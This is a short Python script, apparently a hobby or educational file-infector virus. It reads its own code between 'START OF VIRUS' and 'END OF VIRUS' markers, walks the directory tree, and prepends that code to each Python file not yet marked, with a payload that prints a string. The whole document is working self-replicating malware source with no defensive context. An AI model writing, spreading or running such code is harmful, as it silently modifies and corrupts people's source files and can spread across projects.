### START OF VIRUS ###

import glob
import sys
import os

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRUS ###\n':
        break

dir_path = os.path.dirname(os.path.realpath(__file__)) # Pega diretorio atual
for root, dirs, files in os.walk(dir_path):
    for file in files:
        if file.endswith('.py'): # filtra arquivos .py
            with open(root+'/'+str(file), 'r') as f: # abre cada arquivo com seu caminho inteiro,caso contrário dá erro
                script_code = f.readlines()

            infected = False 
            for line in script_code:
                if line == '### START OF VIRUS ###\n':
                    infected = True
                    break
            if not infected:
                final_code = []
                final_code.extend(code)
                final_code.extend('\n')
                final_code.extend(script_code)

                with open(file, 'w') as f:
                    f.writelines(final_code)
# Malicious Piece of Code (Payload)
print('GhosteHypxw')

### END OF VIRUS ###
